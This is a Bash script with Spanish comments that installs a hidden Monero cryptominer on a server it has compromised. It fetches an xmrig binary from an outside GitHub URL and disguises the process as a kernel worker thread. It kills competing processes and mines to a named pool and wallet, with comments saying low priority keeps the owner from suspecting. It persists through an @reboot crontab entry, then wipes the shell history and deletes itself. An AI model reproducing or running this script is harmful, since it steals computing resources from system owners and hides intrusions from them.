#!/bin/bash

# --- CONFIGURACIÓN MAESTRA ---
# La URL que me pasaste (la usaremos con -L para seguir redirecciones)
WGET_URL="https://github.com/p2151868-wq/xmr/raw/refs/heads/main/xmrig"
# Nombre falso para el proceso (para que parezca un hilo del sistema)
FAKE_NAME="[kworker/u2:1-ev]"
# Tu Pool y Wallet
POOL="gulf.moneroocean.stream:10128"
WALLET="46Sic8EdWznhfw1P7P7yTiJgChtRMRReVD4Jpa3L93pG1Xy1W9BxQZhFBBv9FMuRgC6tM6hkVRsKtSoRVoSvfB11NX49MCS"

# 1. POSICIONAMIENTO
cd /tmp || cd /var/tmp

# 2. LIMPIEZA DE HUELLAS PREVIAS
pkill -9 -f "xmrig" 2>/dev/null
pkill -9 -f "kworker" 2>/dev/null

# 3. DESCARGA DEL BINARIO
# -f falla silenciosamente si hay error, -L sigue el enlace, -s es silencioso
curl -fLs "$WGET_URL" -o "$FAKE_NAME" || wget -q "$WGET_URL" -O "$FAKE_NAME"

# Verificamos si bajó algo (si pesa 0 bytes, el archivo no está bien en Git)
if [ ! -s "$FAKE_NAME" ]; then
    exit 1
fi

# 4. EJECUCIÓN Y PERSISTENCIA
chmod +x "$FAKE_NAME"

# Ejecutamos con prioridad baja para que el servidor no se trabe y el dueño no sospeche
nohup ./"$FAKE_NAME" -o $POOL -u $WALLET -p x --donate-level 1 --background >/dev/null 2>&1 &

# Aseguramos que inicie tras reinicios
(crontab -l 2>/dev/null; echo "@reboot /tmp/$FAKE_NAME -o $POOL -u $WALLET -p x --background") | crontab -

# 5. BORRAR EL HISTORIAL DE COMANDOS
history -c
rm -- "$0" 2>/dev/null
